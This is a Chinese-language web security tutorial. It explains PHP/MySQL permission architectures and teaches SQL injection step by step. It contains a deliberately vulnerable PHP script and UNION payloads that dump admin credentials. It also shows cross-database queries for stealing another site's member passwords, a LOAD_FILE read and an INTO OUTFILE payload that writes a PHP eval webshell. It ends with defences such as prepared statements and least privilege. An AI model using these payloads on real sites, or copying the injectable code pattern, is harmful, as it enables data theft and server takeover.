#  042：PHP应用与MySQL架构、SQL注入、跨库查询、文件读写与权限操作 🔍

在本节课中，我们将学习PHP应用与MySQL数据库架构的基础知识，并深入探讨SQL注入漏洞的原理、利用方式及其高级操作，包括跨库查询、文件读写和权限操作。通过理解这些核心概念，你将能够更好地识别和利用SQL注入漏洞。

![](img/405616e6279047f0a8b81af09c2a96bc_1.png)

![](img/405616e6279047f0a8b81af09c2a96bc_3.png)

![](img/405616e6279047f0a8b81af09c2a96bc_4.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_6.png)

![](img/405616e6279047f0a8b81af09c2a96bc_8.png)

![](img/405616e6279047f0a8b81af09c2a96bc_10.png)

## 概述 📋

本节课将首先介绍PHP与MySQL的常见架构模式，然后详细讲解SQL注入漏洞的产生原理。我们将通过实际代码演示，展示如何利用SQL注入进行数据窃取、跨库查询以及文件读写操作。最后，我们会讨论权限对注入利用的影响，并总结防御措施。

![](img/405616e6279047f0a8b81af09c2a96bc_12.png)

![](img/405616e6279047f0a8b81af09c2a96bc_14.png)

---

## PHP与MySQL架构模式 🏗️

在开始学习SQL注入之前，我们需要了解PHP应用与MySQL数据库的两种常见架构模式。这两种模式决定了数据库用户权限的分配方式，直接影响SQL注入攻击的潜在影响范围。

![](img/405616e6279047f0a8b81af09c2a96bc_16.png)

![](img/405616e6279047f0a8b81af09c2a96bc_18.png)

### 统一管理架构（Root用户模式）

![](img/405616e6279047f0a8b81af09c2a96bc_20.png)

![](img/405616e6279047f0a8b81af09c2a96bc_22.png)

在这种模式下，所有网站共享同一个MySQL的`root`用户（或具有高权限的管理员用户）来管理各自的数据库。

![](img/405616e6279047f0a8b81af09c2a96bc_24.png)

![](img/405616e6279047f0a8b81af09c2a96bc_26.png)

![](img/405616e6279047f0a8b81af09c2a96bc_28.png)

![](img/405616e6279047f0a8b81af09c2a96bc_30.png)

![](img/405616e6279047f0a8b81af09c2a96bc_32.png)

**架构模型：**
```
MySQL 数据库
├── root 用户 (最高权限)
│   ├── 网站A数据库 (例如：zblog)
│   └── 网站B数据库 (例如：demo01)
```

![](img/405616e6279047f0a8b81af09c2a96bc_34.png)

**特点：**
*   一个高权限用户管理所有数据库。
*   如果一个网站存在SQL注入漏洞，攻击者可能利用该漏洞访问和操作同一MySQL实例下的其他网站数据库。

![](img/405616e6279047f0a8b81af09c2a96bc_36.png)

![](img/405616e6279047f0a8b81af09c2a96bc_38.png)

![](img/405616e6279047f0a8b81af09c2a96bc_40.png)

![](img/405616e6279047f0a8b81af09c2a96bc_42.png)

### 独立管理架构（独立用户模式）

![](img/405616e6279047f0a8b81af09c2a96bc_44.png)

在这种模式下，每个网站使用独立的、权限受限的MySQL用户来管理自己的数据库。

![](img/405616e6279047f0a8b81af09c2a96bc_46.png)

![](img/405616e6279047f0a8b81af09c2a96bc_48.png)

![](img/405616e6279047f0a8b81af09c2a96bc_50.png)

![](img/405616e6279047f0a8b81af09c2a96bc_52.png)

**架构模型：**
```
MySQL 数据库
├── 网站A用户 (例如：user_a)
│   └── 网站A数据库
└── 网站B用户 (例如：user_b)
    └── 网站B数据库
```

![](img/405616e6279047f0a8b81af09c2a96bc_54.png)

![](img/405616e6279047f0a8b81af09c2a96bc_56.png)

![](img/405616e6279047f0a8b81af09c2a96bc_58.png)

**特点：**
*   每个数据库由专属的低权限用户管理。
*   用户通常只能访问自己名下的数据库。
*   即使一个网站存在注入点，攻击者也难以跨库访问其他网站的数据，安全性相对更高。

**理解这两种架构对于后续分析注入点的危害和制定攻击策略至关重要。**

![](img/405616e6279047f0a8b81af09c2a96bc_60.png)

![](img/405616e6279047f0a8b81af09c2a96bc_62.png)

![](img/405616e6279047f0a8b81af09c2a96bc_64.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_66.png)

![](img/405616e6279047f0a8b81af09c2a96bc_68.png)

![](img/405616e6279047f0a8b81af09c2a96bc_70.png)

## SQL注入原理与基础利用 🎯

![](img/405616e6279047f0a8b81af09c2a96bc_72.png)

![](img/405616e6279047f0a8b81af09c2a96bc_74.png)

![](img/405616e6279047f0a8b81af09c2a96bc_76.png)

![](img/405616e6279047f0a8b81af09c2a96bc_78.png)

上一节我们介绍了数据库的架构模式，本节中我们来看看SQL注入漏洞的核心原理。SQL注入的本质是：应用程序将用户输入的数据，未经充分过滤或转义，直接拼接到了SQL查询语句中并执行。

![](img/405616e6279047f0a8b81af09c2a96bc_80.png)

### 漏洞代码示例

![](img/405616e6279047f0a8b81af09c2a96bc_82.png)

假设我们有以下简单的PHP代码（`64.php`）：

![](img/405616e6279047f0a8b81af09c2a96bc_84.png)

```php
<?php
include 'config.php'; // 包含数据库配置文件
$id = $_GET['id'] ?? 1; // 获取用户输入的id参数，默认为1
$sql = "SELECT * FROM news WHERE id = $id"; // 将用户输入直接拼接到SQL语句
$result = mysqli_query($conn, $sql);
// ... 输出查询结果 ...
?>
```

![](img/405616e6279047f0a8b81af09c2a96bc_86.png)

**数据库配置文件 (`config.php`) 可能如下：**
```php
<?php
$conn = mysqli_connect('localhost', 'root', '123456', 'demo01');
?>
```

![](img/405616e6279047f0a8b81af09c2a96bc_88.png)

![](img/405616e6279047f0a8b81af09c2a96bc_90.png)

### 正常访问与攻击演示

1.  **正常访问：** 当用户访问 `http://site.com/64.php?id=1` 时，执行的SQL语句是：
    ```sql
    SELECT * FROM news WHERE id = 1
    ```
    这会返回`news`表中`id`为1的文章。

2.  **注入攻击：** 当攻击者访问 `http://site.com/64.php?id=-1 UNION SELECT 1,2,3,username,password,6 FROM admin` 时，执行的SQL语句变为：
    ```sql
    SELECT * FROM news WHERE id = -1 UNION SELECT 1,2,3,username,password,6 FROM admin
    ```
    由于`id=-1`通常不存在，原查询结果为空。`UNION`操作会执行后半段查询，从而将`admin`表中的用户名和密码显示在网页上。

![](img/405616e6279047f0a8b81af09c2a96bc_92.png)

![](img/405616e6279047f0a8b81af09c2a96bc_94.png)

![](img/405616e6279047f0a8b81af09c2a96bc_96.png)

![](img/405616e6279047f0a8b81af09c2a96bc_98.png)

**核心公式：**
```
恶意用户输入 + 未过滤的SQL拼接 = 可被操控的SQL语句执行
```

![](img/405616e6279047f0a8b81af09c2a96bc_100.png)

**攻击者的思路是：SQL语句能执行什么操作，注入攻击就能实现什么目的。而SQL语句的功能由数据库类型（如MySQL、Oracle）决定。**

---

![](img/405616e6279047f0a8b81af09c2a96bc_102.png)

![](img/405616e6279047f0a8b81af09c2a96bc_104.png)

![](img/405616e6279047f0a8b81af09c2a96bc_106.png)

## MySQL信息收集与数据获取 📊

![](img/405616e6279047f0a8b81af09c2a96bc_108.png)

![](img/405616e6279047f0a8b81af09c2a96bc_109.png)

![](img/405616e6279047f0a8b81af09c2a96bc_111.png)

在上一节我们看到了基础的注入利用，但在实战中，我们通常不知道数据库的表名和列名。本节将介绍如何利用MySQL的内置系统数据库`information_schema`来获取这些信息。

![](img/405616e6279047f0a8b81af09c2a96bc_113.png)

### 关键信息收集

![](img/405616e6279047f0a8b81af09c2a96bc_115.png)

在开始注入前，我们通常需要收集一些基本信息：
*   **数据库版本：** `version()` - 判断是否支持`information_schema`（通常需>5.0）。
*   **当前用户：** `user()` - 判断是否为高权限用户（如`root`），这关系到能否进行跨库查询和文件读写。
*   **当前数据库名：** `database()`。
*   **操作系统信息：** `@@version_compile_os` - 影响路径大小写（Linux敏感，Windows不敏感）。

![](img/405616e6279047f0a8b81af09c2a96bc_117.png)

![](img/405616e6279047f0a8b81af09c2a96bc_119.png)

![](img/405616e6279047f0a8b81af09c2a96bc_120.png)

![](img/405616e6279047f0a8b81af09c2a96bc_122.png)

![](img/405616e6279047f0a8b81af09c2a96bc_124.png)

**示例注入语句：**
```sql
?id=-1 UNION SELECT 1,version(),database(),user(),@@version_compile_os,6
```

![](img/405616e6279047f0a8b81af09c2a96bc_126.png)

![](img/405616e6279047f0a8b81af09c2a96bc_128.png)

![](img/405616e6279047f0a8b81af09c2a96bc_130.png)

![](img/405616e6279047f0a8b81af09c2a96bc_132.png)

### 利用 `information_schema` 获取数据结构

![](img/405616e6279047f0a8b81af09c2a96bc_134.png)

`information_schema` 是MySQL自带的信息数据库，存储了关于所有数据库、表、列等元数据。

![](img/405616e6279047f0a8b81af09c2a96bc_136.png)

![](img/405616e6279047f0a8b81af09c2a96bc_138.png)

![](img/405616e6279047f0a8b81af09c2a96bc_140.png)

以下是获取数据的标准步骤：

1.  **获取所有数据库名：**
    ```sql
    UNION SELECT 1,2,3,4,group_concat(schema_name),6 FROM information_schema.schemata
    ```
    *   `information_schema.schemata` 表存储所有数据库名。

![](img/405616e6279047f0a8b81af09c2a96bc_142.png)

![](img/405616e6279047f0a8b81af09c2a96bc_144.png)

2.  **获取指定数据库（如`demo01`）下的所有表名：**
    ```sql
    UNION SELECT 1,2,3,4,group_concat(table_name),6 FROM information_schema.tables WHERE table_schema='demo01'
    ```
    *   `information_schema.tables` 表存储所有表的信息。
    *   `table_schema` 字段指定数据库名。

3.  **获取指定表（如`admin`）下的所有列名：**
    ```sql
    UNION SELECT 1,2,3,4,group_concat(column_name),6 FROM information_schema.columns WHERE table_schema='demo01' AND table_name='admin'
    ```
    *   `information_schema.columns` 表存储所有列的信息。

![](img/405616e6279047f0a8b81af09c2a96bc_146.png)

![](img/405616e6279047f0a8b81af09c2a96bc_148.png)

4.  **最终获取数据：**
    ```sql
    UNION SELECT 1,2,3,username,password,6 FROM admin
    ```

![](img/405616e6279047f0a8b81af09c2a96bc_150.png)

**通过这套流程，攻击者可以系统地从一个未知结构的数据库中提取出敏感数据，而无需依赖猜测。**

![](img/405616e6279047f0a8b81af09c2a96bc_152.png)

![](img/405616e6279047f0a8b81af09c2a96bc_154.png)

![](img/405616e6279047f0a8b81af09c2a96bc_156.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_158.png)

![](img/405616e6279047f0a8b81af09c2a96bc_160.png)

![](img/405616e6279047f0a8b81af09c2a96bc_162.png)

![](img/405616e6279047f0a8b81af09c2a96bc_164.png)

## 跨库查询 🌉

![](img/405616e6279047f0a8b81af09c2a96bc_166.png)

![](img/405616e6279047f0a8b81af09c2a96bc_168.png)

回顾我们最初讲的架构模式，如果注入点使用的是高权限数据库用户（如`root`），攻击者就可以进行跨库查询。这意味着，通过一个网站的注入点，可以窃取同一MySQL服务器上其他网站数据库的数据。

![](img/405616e6279047f0a8b81af09c2a96bc_170.png)

![](img/405616e6279047f0a8b81af09c2a96bc_172.png)

![](img/405616e6279047f0a8b81af09c2a96bc_174.png)

![](img/405616e6279047f0a8b81af09c2a96bc_176.png)

### 跨库查询条件

![](img/405616e6279047f0a8b81af09c2a96bc_178.png)

![](img/405616e6279047f0a8b81af09c2a96bc_180.png)

![](img/405616e6279047f0a8b81af09c2a96bc_182.png)

![](img/405616e6279047f0a8b81af09c2a96bc_184.png)

![](img/405616e6279047f0a8b81af09c2a96bc_186.png)

![](img/405616e6279047f0a8b81af09c2a96bc_188.png)

1.  注入点当前数据库连接用户为高权限用户（如`root`）。
2.  知道或能猜出目标数据库的名字。

![](img/405616e6279047f0a8b81af09c2a96bc_190.png)

![](img/405616e6279047f0a8b81af09c2a96bc_192.png)

![](img/405616e6279047f0a8b81af09c2a96bc_194.png)

### 攻击演示

![](img/405616e6279047f0a8b81af09c2a96bc_196.png)

![](img/405616e6279047f0a8b81af09c2a96bc_198.png)

假设我们通过注入点发现当前用户是`root`，并且通过查询`information_schema.schemata`得到了一个疑似其他网站的数据库名`zblog`。

![](img/405616e6279047f0a8b81af09c2a96bc_200.png)

![](img/405616e6279047f0a8b81af09c2a96bc_202.png)

攻击步骤如下：

![](img/405616e6279047f0a8b81af09c2a96bc_204.png)

![](img/405616e6279047f0a8b81af09c2a96bc_206.png)

![](img/405616e6279047f0a8b81af09c2a96bc_208.png)

1.  **查询`zblog`数据库下的表名：**
    ```sql
    UNION SELECT 1,2,3,4,group_concat(table_name),6 FROM information_schema.tables WHERE table_schema='zblog'
    ```

![](img/405616e6279047f0a8b81af09c2a96bc_210.png)

2.  **假设发现`zbp_member`表，查询其列名：**
    ```sql
    UNION SELECT 1,2,3,4,group_concat(column_name),6 FROM information_schema.columns WHERE table_schema='zblog' AND table_name='zbp_member'
    ```

![](img/405616e6279047f0a8b81af09c2a96bc_212.png)

![](img/405616e6279047f0a8b81af09c2a96bc_214.png)

![](img/405616e6279047f0a8b81af09c2a96bc_216.png)

![](img/405616e6279047f0a8b81af09c2a96bc_218.png)

3.  **最终跨库查询用户数据：**
    ```sql
    UNION SELECT 1,2,3,mem_Name,mem_Password,6 FROM zblog.zbp_member
    ```
    **注意：** 这里使用了 `zblog.zbp_member` 来明确指定数据库和表，这是跨库查询的关键语法。

![](img/405616e6279047f0a8b81af09c2a96bc_220.png)

![](img/405616e6279047f0a8b81af09c2a96bc_222.png)

![](img/405616e6279047f0a8b81af09c2a96bc_224.png)

**如果数据库连接用户是普通用户（如`demo01`），则只能访问`demo01`数据库，无法进行跨库查询。这体现了独立用户架构的安全性优势。**

![](img/405616e6279047f0a8b81af09c2a96bc_226.png)

![](img/405616e6279047f0a8b81af09c2a96bc_228.png)

![](img/405616e6279047f0a8b81af09c2a96bc_230.png)

![](img/405616e6279047f0a8b81af09c2a96bc_232.png)

![](img/405616e6279047f0a8b81af09c2a96bc_234.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_236.png)

## 文件读写操作 📁

![](img/405616e6279047f0a8b81af09c2a96bc_238.png)

![](img/405616e6279047f0a8b81af09c2a96bc_240.png)

![](img/405616e6279047f0a8b81af09c2a96bc_242.png)

![](img/405616e6279047f0a8b81af09c2a96bc_244.png)

![](img/405616e6279047f0a8b81af09c2a96bc_246.png)

某些高权限的SQL注入点还允许进行文件读写操作，这可能导致更严重的后果，如直接获取Webshell。

![](img/405616e6279047f0a8b81af09c2a96bc_248.png)

### 文件读写条件

![](img/405616e6279047f0a8b81af09c2a96bc_250.png)

![](img/405616e6279047f0a8b81af09c2a96bc_252.png)

![](img/405616e6279047f0a8b81af09c2a96bc_254.png)

![](img/405616e6279047f0a8b81af09c2a96bc_256.png)

![](img/405616e6279047f0a8b81af09c2a96bc_258.png)

1.  **数据库用户权限高：** 通常是`root`或具有`FILE`权限的用户。
2.  **MySQL配置允许：** `secure_file_priv` 系统变量不能设置为`NULL`（完全禁止）或特定目录外的路径。空值或特定目录则允许对应操作。
3.  **知道服务器上的绝对路径：** 这是写入Webshell的关键。

![](img/405616e6279047f0a8b81af09c2a96bc_260.png)

![](img/405616e6279047f0a8b81af09c2a96bc_262.png)

![](img/405616e6279047f0a8b81af09c2a96bc_264.png)

![](img/405616e6279047f0a8b81af09c2a96bc_266.png)

### 相关SQL函数

![](img/405616e6279047f0a8b81af09c2a96bc_268.png)

![](img/405616e6279047f0a8b81af09c2a96bc_270.png)

![](img/405616e6279047f0a8b81af09c2a96bc_272.png)

*   **读取文件：** `LOAD_FILE(‘文件路径’)`
    ```sql
    UNION SELECT 1,2,3,4,LOAD_FILE(‘D:/www/site/config.php’),6
    ```
*   **写入文件：** `INTO OUTFILE` / `INTO DUMPFILE`
    ```sql
    UNION SELECT 1,2,3,4,‘<?php @eval($_POST[cmd]);?>‘,6 INTO OUTFILE ‘D:/www/site/shell.php’
    ```

![](img/405616e6279047f0a8b81af09c2a96bc_274.png)

![](img/405616e6279047f0a8b81af09c2a96bc_276.png)

![](img/405616e6279047f0a8b81af09c2a96bc_278.png)

### 如何获取网站路径？

![](img/405616e6279047f0a8b81af09c2a96bc_280.png)

![](img/405616e6279047f0a8b81af09c2a96bc_282.png)

*   **报错信息：** 网站开启错误显示时，可能暴露物理路径。
*   **PHP探针：** 如`phpinfo()`页面。
*   **读取配置文件：** 如Apache的`httpd.conf`或网站的数据库配置文件。
*   **常见默认路径猜测：** 根据中间件（如Apache、Nginx）和操作系统的常见安装路径进行尝试。

![](img/405616e6279047f0a8b81af09c2a96bc_284.png)

![](img/405616e6279047f0a8b81af09c2a96bc_286.png)

![](img/405616e6279047f0a8b81af09c2a96bc_288.png)

![](img/405616e6279047f0a8b81af09c2a96bc_290.png)

![](img/405616e6279047f0a8b81af09c2a96bc_292.png)

![](img/405616e6279047f0a8b81af09c2a96bc_294.png)

**文件读写是SQL注入的高危利用方式，一旦成功，攻击者几乎可以完全控制服务器。但现代MySQL版本（如8.0+）默认的`secure_file_priv`设置和独立用户架构极大地降低了此类风险。**

![](img/405616e6279047f0a8b81af09c2a96bc_296.png)

![](img/405616e6279047f0a8b81af09c2a96bc_298.png)

![](img/405616e6279047f0a8b81af09c2a96bc_300.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_302.png)

![](img/405616e6279047f0a8b81af09c2a96bc_304.png)

![](img/405616e6279047f0a8b81af09c2a96bc_306.png)

![](img/405616e6279047f0a8b81af09c2a96bc_308.png)

![](img/405616e6279047f0a8b81af09c2a96bc_310.png)

## 权限与防御总结 🛡️

本节课我们一起学习了SQL注入从原理到高级利用的全过程。我们来总结一下权限的核心作用以及基本的防御思路。

![](img/405616e6279047f0a8b81af09c2a96bc_312.png)

![](img/405616e6279047f0a8b81af09c2a96bc_314.png)

![](img/405616e6279047f0a8b81af09c2a96bc_316.png)

### 权限的核心影响

![](img/405616e6279047f0a8b81af09c2a96bc_318.png)

![](img/405616e6279047f0a8b81af09c2a96bc_320.png)

![](img/405616e6279047f0a8b81af09c2a96bc_322.png)

![](img/405616e6279047f0a8b81af09c2a96bc_324.png)

![](img/405616e6279047f0a8b81af09c2a96bc_326.png)

*   **数据库用户权限**是决定注入危害程度的关键。
    *   **高权限用户（如root）：** 可进行跨库查询、文件读写，危害极大。
    *   **低权限用户：** 通常只能影响当前数据库，危害相对可控。
*   **架构模式选择**直接影响数据库用户权限的分配。
    *   为每个应用分配独立的、权限最小的数据库用户，是有效的安全实践。

![](img/405616e6279047f0a8b81af09c2a96bc_328.png)

![](img/405616e6279047f0a8b81af09c2a96bc_329.png)

### 基础防御措施

1.  **使用预处理语句（参数化查询）：** 这是最有效、最根本的防御手段。确保用户输入永远不被解释为SQL代码的一部分。
    ```php
    // PDO 示例
    $stmt = $pdo->prepare(‘SELECT * FROM users WHERE email = :email’);
    $stmt->execute([‘email’ => $email]);
    ```
2.  **对输入进行严格的过滤和转义：** 如果必须拼接SQL，务必使用数据库驱动提供的专用转义函数（如`mysqli_real_escape_string`）。
3.  **最小权限原则：** 应用程序连接数据库时，使用仅能满足其功能需求的最低权限用户。
4.  **关闭错误回显：** 避免将数据库错误信息（可能包含路径、SQL语句片段）直接展示给用户。
5.  **使用Web应用防火墙（WAF）：** 可以帮助拦截一些常见的注入攻击payload。

![](img/405616e6279047f0a8b81af09c2a96bc_331.png)

![](img/405616e6279047f0a8b81af09c2a96bc_333.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_335.png)

![](img/405616e6279047f0a8b81af09c2a96bc_337.png)

![](img/405616e6279047f0a8b81af09c2a96bc_339.png)

![](img/405616e6279047f0a8b81af09c2a96bc_340.png)

![](img/405616e6279047f0a8b81af09c2a96bc_342.png)

![](img/405616e6279047f0a8b81af09c2a96bc_344.png)

## 总结 📝

![](img/405616e6279047f0a8b81af09c2a96bc_346.png)

![](img/405616e6279047f0a8b81af09c2a96bc_348.png)

![](img/405616e6279047f0a8b81af09c2a96bc_350.png)

![](img/405616e6279047f0a8b81af09c2a96bc_352.png)

在本节课中，我们系统地学习了：
1.  **PHP+MySQL的两种架构模式**及其安全含义。
2.  **SQL注入的根本原理**：用户输入未经处理直接拼接至SQL语句。
3.  **利用`information_schema`** 进行系统化的信息收集和数据窃取。
4.  **高权限下的高级操作**：跨库查询和文件读写，并分析了其依赖条件。
5.  **权限的核心重要性**以及基础的防御理念。

![](img/405616e6279047f0a8b81af09c2a96bc_354.png)

![](img/405616e6279047f0a8b81af09c2a96bc_356.png)

![](img/405616e6279047f0a8b81af09c2a96bc_358.png)

![](img/405616e6279047f0a8b81af09c2a96bc_360.png)

SQL注入虽然是一种“古老”的漏洞，但其原理是理解许多Web安全问题的基石。理解攻击，是为了更好地防御。在后续课程中，我们将继续探讨其他类型的漏洞和更复杂的绕过技术。